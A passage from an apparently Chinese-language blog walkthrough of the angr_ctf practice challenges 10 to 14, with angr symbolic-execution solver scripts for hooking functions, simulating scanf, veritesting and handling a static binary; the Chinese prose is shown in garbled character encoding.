æ¥æ›¿æ¢æ‰ä¸€äº›åº“å‡½æ•°<br>è‹¥æˆ‘ä»¬å·²ç»æœ‰è¯¥äºŒè¿›åˆ¶æ–‡ä»¶çš„ç¬¦å·è¡¨ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨ <code>project.hook_symbol(symbol_str, sim_procedure_instance)</code> æ¥è‡ªåŠ¨ hook æ‰æ–‡ä»¶ä¸­æ‰€æœ‰çš„å¯¹åº”ç¬¦å·ï¼Œå…¶ä¸­ <code>run()</code> æ–¹æ³•çš„<strong>å‚æ•°ä¸ºè¢«æ›¿æ¢å‡½æ•°æ‰€æ¥æ”¶çš„å‚æ•°</strong>ï¼Œè¿™æ˜¯ä¸€ä¸ªğŸŒ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python3">import angr<br>import claripy<br><br>class MyProcedure(angr.SimProcedure):<br>    def run(self, arg1, arg2):<br>        # do something, this&#x27;s an example<br>        return self.state.memory.load(arg1, arg2)<br><br>proj = angr.Project(&#x27;./test&#x27;)<br>proj.hook_symbol(&#x27;func_to_hook&#x27;, MyProcedure())<br></code></pre></td></tr></table></figure><p>å½“ç„¶ï¼Œåœ¨ SimProcedure çš„ <code>run()</code> è¿‡ç¨‹ä¸­æˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨ä¸€äº›æœ‰ç”¨çš„æˆå‘˜å‡½æ•°ï¼š</p><ul><li><code>ret(expr)</code>: å‡½æ•°è¿”å›</li><li><code>jump(addr)</code>: è·³è½¬åˆ°æŒ‡å®šåœ°å€</li><li><code>exit(code)</code>: ç»ˆæ­¢ç¨‹åº</li><li><code>call(addr, args, continue_at)</code>: è°ƒç”¨æ–‡ä»¶ä¸­çš„å‡½æ•°</li><li><code>inline_call(procedure, *args)</code>: å†…è”åœ°è°ƒç”¨å¦ä¸€ä¸ª SimProcedure</li></ul><h3 id="FINAL-EXPLOIT-6"><a href="#FINAL-EXPLOIT-6" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h3><p>é‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬åªéœ€è¦å°†è¯¥ç¬¦å·ç›´æ¥æ›¿æ¢æˆæˆ‘ä»¬çš„è‡ªå®šä¹‰æ¯”è¾ƒå‡½æ•°å³å¯ï¼Œå› æ­¤æœ€ç»ˆçš„å†™æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python3">import angr<br>import claripy<br>import sys<br><br>class MyRelacementHookProcedure(angr.SimProcedure):<br>    def run(self, buffer_addr, buffer_len):<br>        buffer = self.state.memory.load(buffer_addr, buffer_len)<br>        compared_str = b&#x27;XFQUUEQFKBECVEJF&#x27;<br>        return claripy.If(buffer == compared_str, claripy.BVV(1, 32), claripy.BVV(0, 32))<br><br>def find_path(state):<br>    return b&#x27;Good Job.&#x27; in state.posix.dumps(sys.stdout.fileno())<br><br>def avoid_path(state):<br>    return b&#x27;Try again.&#x27; in state.posix.dumps(sys.stdout.fileno())<br><br>def solver():<br>    bin_path = &#x27;./10_angr_simprocedures&#x27;<br>    proj = angr.Project(bin_path)<br>    init_state = proj.factory.entry_state()<br><br>    # hook the check_equals()<br>    proj.hook_symbol(&#x27;check_equals_XFQUUEQFKBECVEJF&#x27;, MyRelacementHookProcedure())<br><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = find_path, avoid = avoid_path)<br><br>    if simgr.found:<br>        solution_state = simgr.found[0]<br>        print(solution_state.posix.dumps(sys.stdin.fileno()))<br>    else:<br>        raise Exception(&#x27;Could not find the solution&#x27;)<br><br>if __name__ == &#x27;__main__&#x27;:<br>    solver()<br></code></pre></td></tr></table></figure><p>è¿˜æ˜¯ç§’è§£ï¼š</p><p><img src="https://s2.loli.net/2022/11/03/1GntXiVluADdbRs.png" alt="image.png"></p><h2 id="11-angr-sim-scanfï¼šæ¨¡æ‹Ÿ-scanf"><a href="#11-angr-sim-scanfï¼šæ¨¡æ‹Ÿ-scanf" class="headerlink" title="11_angr_sim_scanfï¼šæ¨¡æ‹Ÿ scanf"></a>11_angr_sim_scanfï¼šæ¨¡æ‹Ÿ scanf</h2><p>æƒ¯ä¾‹æ‹–è¿› IDAï¼Œæç¤º graph is too big</p><p><img src="https://s2.loli.net/2022/11/03/epOU2j6iDcyZutL.png" alt="image.png"></p><p>çœ‹ä¸€ä¸‹åæ±‡ç¼–ï¼Œå¯ä»¥å‘ç°è¿™ä¸€æ¬¡æ˜¯åœ¨ <code>scanf()</code> å‰é¢æœ‰å¾ˆå¤šä¼ªåˆ†æ”¯ï¼š</p><p><img src="https://s2.loli.net/2022/11/03/LP97x2dUXNjTsKz.png" alt="image.png"></p><p>è¿™äº›ä¼ªåˆ†æ”¯çš„å¯¼å‘éƒ½æ˜¯ä»¥ <code>scanf()</code> å¼€å¤´çš„åŸºæœ¬å—ï¼Œå¯ä»¥çœ‹åˆ°çš„æ˜¯å…¶éƒ½ä½¿ç”¨ <code>%u %u</code> æ¥è¯»å…¥ä¸¤ä¸ªå››å­—èŠ‚æ— ç¬¦å·æ•°åä½¿ç”¨ <code>strncmp()</code> ä¸ 8 å­—èŠ‚çš„å­—ç¬¦ä¸²è¿›è¡Œå¯¹æ¯”</p><p><img src="https://s2.loli.net/2022/11/03/d4GlDOc7TANCZMS.png" alt="image.png"></p><p>åœ¨æœ€å¼€å§‹è¿˜æœ‰ <code>complex_function()</code> å¤„ç†å¾…æ¯”è¾ƒçš„æºå­—ç¬¦ä¸²ï¼Œè¿˜æ˜¯è€æ ·å­å°±ä¸è¿›å»çœ‹äº†ï¼š</p><p><img src="https://s2.loli.net/2022/11/03/v8bZzJgAPOpG7K4.png" alt="image.png"></p><p>é‚£ä¹ˆè¿™é¢˜çš„ç»“æ„å’Œ 02 å…¶å®æ˜¯åŸºæœ¬ä¸Šä¸€æ ·çš„ï¼Œåªä¸è¿‡ <code>scanf()</code> è¢«ç§»åˆ°äº†ä¼ªåˆ†æ”¯åŸºæœ¬å—ä¸­ï¼Œå› æ­¤ç”¨ 02 çš„è§£é¢˜è„šæœ¬ä¾ç„¶å¯ä»¥ç§’è§£ï¼Œä½†è¿™æ ·å°±ä¸æ˜¯æˆ‘ä»¬åšé¢˜çš„ç›®çš„äº†ï¼šï¼‰</p><p>æœ¬é¢˜å®é™…ä¸Šç®—æ˜¯å¯¹ä¸Šä¸€é¢˜çš„æ‰©å±•ï¼Œç”±äºæˆ‘ä»¬å·²çŸ¥å¯¹ <code>scanf()</code> çš„è°ƒç”¨ä¼šè¯»å…¥ä¸¤ä¸ªæ•°å€¼ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å®ç°ä¸€ä¸ª SimProcedure æ¥æ¨¡æ‹Ÿè¯¥è¿‡ç¨‹ï¼Œè€Œä¸éœ€è¦å†èµ° <code>scanf()</code> å†…éƒ¨çš„å¤æ‚è·¯å¾„</p><p>è¿™é‡Œæˆ‘ä»¬è‹¥æ˜¯åœ¨ <code>run()</code> æ–¹æ³•å†…åˆ›å»º BVS ï¼Œåˆ™å¯ä»¥é€šè¿‡å°†å…¶å‚¨å­˜åˆ° <code>state.globals</code> åˆ—è¡¨çš„æ–¹å¼ä»¥ä¾¿åç»­å–ç”¨</p><p>å› æ­¤æœ€åçš„è§£é¢˜è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyScanfProcedure</span>(angr.SimProcedure):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, fmt_str, buffer0_addr, buffer1_addr</span>):<br>        buffer0 = claripy.BVS(<span class="hljs-string">&#x27;buffer0&#x27;</span>, <span class="hljs-number">4</span> * <span class="hljs-number">8</span>) <span class="hljs-comment"># 4 bytes</span><br>        buffer1 = claripy.BVS(<span class="hljs-string">&#x27;buffer1&#x27;</span>, <span class="hljs-number">4</span> * <span class="hljs-number">8</span>) <span class="hljs-comment"># 4 bytes</span><br>        self.state.memory.store(buffer0_addr, buffer0)<br>        self.state.memory.store(buffer1_addr, buffer1)<br>        self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;buffer0&#x27;</span>] = buffer0<br>        self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;buffer1&#x27;</span>] = buffer1<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Good Job.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">avoid_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Try again.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./11_angr_sim_scanf&#x27;</span><br>    proj = angr.Project(bin_path)<br>    init_state = proj.factory.entry_state()<br>    proj.hook_symbol(<span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span>, MyScanfProcedure())<br>    <br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = find_path, avoid = avoid_path)<br><br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        buffer0 = solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;buffer0&#x27;</span>]<br>        buffer1 = solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;buffer1&#x27;</span>]<br>        password0 = solution_state.solver.<span class="hljs-built_in">eval</span>(buffer0, cast_to=<span class="hljs-built_in">bytes</span>)<br>        password1 = solution_state.solver.<span class="hljs-built_in">eval</span>(buffer1, cast_to=<span class="hljs-built_in">bytes</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password0: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>.from_bytes(password0, <span class="hljs-string">&#x27;little&#x27;</span>)))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password1: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>.from_bytes(password1, <span class="hljs-string">&#x27;little&#x27;</span>)))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>è¿˜æ˜¯ç§’è§£ï¼š</p><p><img src="https://s2.loli.net/2022/11/03/pCsdR9Gckawg2Zm.png" alt="image.png"></p><h1 id="0x05-angr-ctfï¼šè·¯å¾„åˆå¹¶"><a href="#0x05-angr-ctfï¼šè·¯å¾„åˆå¹¶" class="headerlink" title="0x05. angr-ctfï¼šè·¯å¾„åˆå¹¶"></a>0x05. angr-ctfï¼šè·¯å¾„åˆå¹¶</h1><h2 id="12-angr-veritestingï¼šè·¯å¾„åˆå¹¶"><a href="#12-angr-veritestingï¼šè·¯å¾„åˆå¹¶" class="headerlink" title="12_angr_veritestingï¼šè·¯å¾„åˆå¹¶"></a>12_angr_veritestingï¼šè·¯å¾„åˆå¹¶</h2><p>æƒ¯ä¾‹æ‹–å…¥ IDAï¼Œä¸çŸ¥é“ä¸ºå•¥ IDA åç¼–è¯‘å‡ºæ¥ä¸€å¨å²æ‰€ä»¥ç›´æ¥çœ‹æ±‡ç¼–ï¼Œåœ¨è¯»å…¥è¾“å…¥åæ¥åˆ°çš„çº¢æ¡†é‡Œæ˜¯ä¸€ä¸ªå¾ªç¯  <code>for (int i = 0; i &lt;= 0x1F; i++)</code> ï¼Œæ¯è½®å¾ªç¯éƒ½ä¼šè®¡ç®— <code>complex_function(&#39;X&#39;, i + &#39;V&#39;)</code> å¹¶å°†ç»“æœä¸ <code>input[i]</code> å¯¹æ¯”ï¼Œå…¨éƒ¨ç›¸ç­‰æ‰èƒ½é€šè¿‡</p><p><img src="https://s2.loli.net/2022/11/04/WaUX8uEwyiMeJFs.png" alt="image.png"></p><p>å½“ç„¶å¦‚æœå½“ä½œå¸¸è§„çš„é€†å‘é¢˜æ¥åšçš„è¯è§£é¢˜è„šæœ¬å¾ˆå¿«å°±èƒ½å†™å¥½äº†ï¼Œä½†è¿™ä¸æ˜¯æˆ‘ä»¬åšé¢˜çš„ç›®çš„ï¼šï¼‰</p><p>è¿™é¢˜çœ‹èµ·æ¥å’Œç¬¬ä¸€é¢˜å·®ä¸å¤šï¼Œç”±ä½†å…¶é€å­—ç¬¦æ¯”è¾ƒå¢åŠ è®¡æ•°çš„å†™æ³•ä¼šå¯¼è‡´è·¯å¾„çˆ†ç‚¸çš„é—®é¢˜ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦è¿›è¡Œ <strong>è·¯å¾„åˆå¹¶</strong> ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨åˆ›å»º simgr æ—¶æŒ‡å®šå‚æ•° <code>veritesting=True</code>ï¼Œè¿™æ · angr ä¾¿ä¼šåœ¨è¿è¡Œè¿‡ç¨‹ä¸­è‡ªåŠ¨è¿›è¡Œè·¯å¾„åˆå¹¶ï¼Œä»è€Œç¼“è§£è·¯å¾„çˆ†ç‚¸çš„é—®é¢˜</p><blockquote><p>å…·ä½“åŸç†å¯ä»¥å‚è€ƒ <a href="https://users.ece.cmu.edu/~dbrumley/pdf/Avgerinos%20et%20al._2014_Enhancing%20Symbolic%20Execution%20with%20Veritesting.pdf">è¿™ç¯‡è®ºæ–‡</a></p></blockquote><p>å› æ­¤æœ€åçš„è§£é¢˜è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;12_angr_veritesting&#x27;</span><br>    proj = angr.Project(bin_path)<br>    init_state = proj.factory.entry_state()<br>    simgr = proj.factory.simgr(init_state, veritesting = <span class="hljs-literal">True</span>)<br>    simgr.explore(find = <span class="hljs-number">0x8049371</span>, avoid = <span class="hljs-number">0x8049393</span>)<br><br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>è¿˜æ˜¯å‡ ç§’é’Ÿå°±è§£å‡ºæ¥äº†ï¼š</p><p><img src="https://s2.loli.net/2022/11/04/FvgfaL9sIjND3bh.png" alt="image.png"></p><h1 id="0x06-angr-ctfï¼šåº“æ“ä½œ"><a href="#0x06-angr-ctfï¼šåº“æ“ä½œ" class="headerlink" title="0x06. angr-ctfï¼šåº“æ“ä½œ"></a>0x06. angr-ctfï¼šåº“æ“ä½œ</h1><h2 id="13-angr-static-binaryï¼šé™æ€ç¼–è¯‘å‡½æ•°æ›¿æ¢"><a href="#13-angr-static-binaryï¼šé™æ€ç¼–è¯‘å‡½æ•°æ›¿æ¢" class="headerlink" title="13_angr_static_binaryï¼šé™æ€ç¼–è¯‘å‡½æ•°æ›¿æ¢"></a>13_angr_static_binaryï¼šé™æ€ç¼–è¯‘å‡½æ•°æ›¿æ¢</h2><p>æƒ¯ä¾‹æ‹–å…¥ IDAï¼Œè¿™æ¬¡è¿˜æ˜¯æƒ¯ä¾‹çš„è¯»å…¥è¾“å…¥åä½¿ç”¨ complex å‡½æ•°å¤„ç†åä¸å¾…å¯¹æ¯”å­—ç¬¦ä¸²è¿›è¡Œå¯¹æ¯”çš„æ¨¡å¼ï¼Œå’Œç¬¬ä¸€é¢˜åŸºæœ¬ä¸€æ ·ï¼Œä¸åŒçš„æ˜¯è¿™ä¸€æ¬¡çš„äºŒè¿›åˆ¶æ–‡ä»¶æ˜¯é™æ€ç¼–è¯‘çš„</p><p><img src="https://s2.loli.net/2022/11/04/4IDZJ85bN2oV6BU.png" alt="image.png"></p><p>ç¬”è€…ä¸€å¼€å§‹ä¹Ÿæ²¡çœ‹æ˜ç™½è¦å¹²å•¥ï¼Œåé¢æ‹‰ç¬¬ä¸€é¢˜çš„è„šæœ¬è¿‡æ¥ç®€å•è·‘äº†ä¸€ä¸‹å‘ç°åŠå¤©æ²¡å‡ºç»“æœï¼Œçœ‹äº†çœ‹å‡ºé¢˜äººç•™ä¸‹çš„ <code>scaffold13.py</code> ä¸­æœ‰è¿™æ ·çš„è¯ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># This challenge is the exact same as the first challenge, except that it was</span><br><span class="hljs-comment"># compiled as a static binary. Normally, Angr automatically replaces standard</span><br><span class="hljs-comment"># library functions with SimProcedures that work much more quickly.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># To solve the challenge, manually hook any standard library c functions that</span><br><span class="hljs-comment"># are used. Then, ensure that you begin the execution at the beginning of the</span><br><span class="hljs-comment"># main function. Do not use entry_state.</span><br></code></pre></td></tr></table></figure><p>å¤§æ¦‚å°±æ˜¯è¯´é€šå¸¸ angr ä¼šè‡ªåŠ¨å°†æ ‡å‡†åº“å½“ä¸­çš„å‡½æ•°æ›¿æ¢æˆ angr å†…å»ºçš„ SimProcedures ä¼ªå‡½æ•°ä»¥è·å¾—æ›´å¿«çš„è¿è¡Œé€Ÿåº¦ï¼Œä½†è¿™ä¸€æ¬¡æ˜¯é™æ€ç¼–è¯‘çš„é¢˜ç›®ï¼Œéœ€è¦æˆ‘ä»¬æ‰‹åŠ¨è¿›è¡Œæ›¿æ¢ï¼›åŒæ—¶ç”±äºç¨‹åºè¿è¡Œèµ·å§‹æ˜¯ <code>__libc_start_main()</code> ï¼Œåœ¨è¿è¡Œåˆ° main ä¹‹å‰ä¼šèµ°å¾ˆå¤šä¸å¿…è¦çš„ä½†æ˜¯è¢«é™æ€ç¼–è¯‘è¿›æ¥çš„å¼¯è·¯ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æ‰‹åŠ¨ä» main å¼€å§‹æ‰§è¡Œè€Œéç›´æ¥ä½¿ç”¨ <code>entry_state()</code> ï¼Œä¸è¿‡ç›´æ¥æ›¿æ¢æ‰ <code>__libc_start_main()</code> ä¹Ÿæ˜¯å¯ä»¥çš„</p><p>è·å– angr å†…ç½®åº“å‡½æ•°çš„æ–¹å¼æ˜¯ <code>angr.SIM_PROCEDURES[lib_name][function_name]</code> ï¼Œå’Œæˆ‘ä»¬ä¹‹å‰è‡ªå®šä¹‰çš„ hook å‡½æ•°ä¸€æ ·éƒ½æ˜¯ <code>SimProcedure</code> ç±»ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>project.hook(func_addr, sim_procedure_instance)</code> çš„æ–¹å¼è¿›è¡Œ hookï¼Œéœ€è¦æ³¨æ„çš„æ˜¯é™¤äº† <code>__libc_start_main</code> ä»¥å¤–çš„éœ€è¦è¢« hook çš„å‡½æ•°éƒ½æœ‰å¤§é‡å¼•ç”¨ï¼Œå› æ­¤ä¸è¦å›¾çœäº‹ç›´æ¥ä½¿ç”¨ <code>hook_symbol()</code></p><p>å› æ­¤æœ€åçš„è§£é¢˜è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Good Job.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">avoid_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Try again.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./13_angr_static_binary&#x27;</span><br>    proj = angr.Project(bin_path)<br>    init_state = proj.factory.entry_state()<br><br>    <span class="hljs-comment"># hook the functions</span><br>    proj.hook(<span class="hljs-number">0x8051330</span>, angr.SIM_PROCEDURES[<span class="hljs-string">&#x27;libc&#x27;</span>][<span class="hljs-string">&#x27;scanf&#x27;</span>]())<br>    proj.hook(<span class="hljs-number">0x80512E0</span>, angr.SIM_PROCEDURES[<span class="hljs-string">&#x27;libc&#x27;</span>][<span class="hljs-string">&#x27;printf&#x27;</span>]())<br>    proj.hook(<span class="hljs-number">0x805EC90</span>, angr.SIM_PROCEDURES[<span class="hljs-string">&#x27;libc&#x27;</span>][<span class="hljs-string">&#x27;puts&#x27;</span>]())<br>    proj.hook(<span class="hljs-number">0x806D530</span>, angr.SIM_PROCEDURES[<span class="hljs-string">&#x27;libc&#x27;</span>][<span class="hljs-string">&#x27;strcmp&#x27;</span>]())<br>    proj.hook_symbol(<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>, <br>                     angr.SIM_PROCEDURES[<span class="hljs-string">&#x27;glibc&#x27;</span>][<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]())<br><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = find_path, avoid = avoid_path)<br><br>    <span class="hljs-keyword">if</span> simgr.found :<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()).decode())<br>    <span class="hljs-keyword">else</span> :<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>è¿™ä¸€æ¬¡è§£é¢˜å¤§æ¦‚éœ€è¦åŠåˆ†é’Ÿå·¦å³</p><p><img src="https://s2.loli.net/2022/11/04/r6W9EHzQy8lGwXe.png" alt="image.png"></p><p>ä»¥åŠç¬”è€…é‡åˆ°ä»¥ä¸‹å‡ ä¸ª<strong>ä¸è§£</strong>çš„ç‚¹ï¼š</p><ul><li>åœ¨å‡ºé¢˜äººç•™ä¸‹çš„ <code>scaffold13.py</code> ä¸­æç¤ºæˆ‘ä»¬åº”å½“å°†åˆå§‹çŠ¶æ€è®¾ä¸º main èµ·å§‹ï¼Œä½†ç¬”è€…è¿™ä¹ˆåšæ— æ³•è§£å‡ºé¢˜ç›®ï¼ˆä¼šç›´æ¥æŠŠç¬”è€…çš„é˜¿é‡Œäº‘å­¦ç”Ÿæœºå†…å­˜æ’‘çˆ†ï¼Œä½†è¿™æ˜¯ä¸åº”è¯¥å‘ç”Ÿçš„ï¼‰</li><li>åœ¨ <code>explore()</code> ä¸­å°† find ä¸ avoid è®¾ä¸ºæ£€æµ‹ stdout ä¸­å­—ç¬¦ä¸²çš„æ–¹å¼ä¼šæ¯”ç›´æ¥å¼•ç”¨åŸºæœ¬å—åœ°å€è¦å¿« 5s</li><li>ä½¿ç”¨ <code>veritesting=True</code> ä¼šå¤§å¹…å»¶é•¿è§£é¢˜æ—¶é—´ï¼ˆçœ‹èµ·æ¥ä¸ä¼šåƒåœ¨ç¬”è€…æœ‰ç”Ÿä¹‹å¹´è§£å‡ºçš„æ ·å­ï¼‰</li><li>ä½¿ç”¨ç›´æ¥ hook å‡½æ•°çš„æ–¹å¼å¯ä»¥è§£å‡ºé¢˜ï¼Œä½†ä½¿ç”¨ hook <code>main()</code> ä¸­ call æŒ‡ä»¤çš„æ–¹å¼<strong>æ— æ³•æ‰¾åˆ°è§£</strong></li><li>æ€»çš„è§£é¢˜æ—¶é—´æ¯”ç¬”è€…é¢„æƒ³ä¸­è¦é•¿å¾—å¤š</li></ul><h2 id="14-angr-shared-libraryï¼šåŠ¨æ€åº“çš„ç¬¦å·æ‰§è¡Œ"><a href="#14-angr-shared-libraryï¼šåŠ¨æ€åº“çš„ç¬¦å·æ‰§è¡Œ" class="headerlink" title="14_angr_shared_libraryï¼šåŠ¨æ€åº“çš„ç¬¦å·æ‰§è¡Œ"></a>14_angr_shared_libraryï¼šåŠ¨æ€åº“çš„ç¬¦å·æ‰§è¡Œ</h2><blockquote><p>è¿™ä¸€é¢˜çš„ç”Ÿæˆè„šæœ¬æœ‰ç‚¹é—®é¢˜ï¼Œç›´æ¥ä½¿ç”¨ä¼šæŠ¥ <code>No such file or directory </code>çš„ gcc errorï¼Œ è¿™æ˜¯å› ä¸ºåœ¨ç”Ÿæˆè„šæœ¬ä¸­çš„ <code>generate()</code> å‡½æ•°æœ€åä¸€è¡Œçš„ gcc å‘½ä»¤ä¸­çš„ <code>-L</code> å‚æ•°æœªæŒ‡å®šç›®å½•ï¼Œåœ¨åé¢åŠ ä¸€ä¸ª <code>.</code> æŒ‡å®šä¸ºå½“å‰ç›®å½•å³å¯</p></blockquote><p>æƒ¯ä¾‹æ‹–å…¥ IDAï¼Œè¿™ä¸€æ¬¡åœ¨è¯»å–è¾“å…¥åè°ƒç”¨äº†è‡ªå®šä¹‰çš„ä¸€ä¸ªåŠ¨æ€é“¾æ¥çš„ <code>validate()</code> å‡½æ•°å¯¹è¾“å…¥è¿›è¡ŒéªŒè¯ï¼Œå…¶å®šä¹‰åœ¨è‡ªå®šä¹‰åº“ 